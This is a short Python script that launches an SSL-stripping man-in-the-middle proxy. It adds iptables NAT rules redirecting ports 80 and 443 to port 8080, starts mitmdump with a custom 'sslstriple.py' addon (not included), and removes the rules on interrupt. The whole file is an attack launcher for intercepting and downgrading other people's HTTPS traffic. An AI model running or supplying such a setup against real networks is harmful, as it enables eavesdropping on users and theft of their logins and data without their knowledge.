import subprocess
import sys
def start_sslsrip_proxy():
    try:
        # Port forwarding ports 80 and 443 to port 8080 for the proxy server
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
                        '--to-port', '8080'], check=True)
        subprocess.run(
            ['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT',
             '--to-port', '8080'], check=True)

        # Starting the proxy server with the custom sslstriple.py script
        subprocess.run(['mitmdump', '-s', 'sslstriple.py', '--listen-port', '8080'], check=True)

    except subprocess.CalledProcessError as e:
        print(f"Error in subprocess execution: {e}")
        sys.exit(1)

    except KeyboardInterrupt:
        # Reverting the port forwarding settings back to normal in the end
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
                        '--to-port', '8080'], check=True)
        subprocess.run(
            ['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT',
             '--to-port', '8080'], check=True)

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)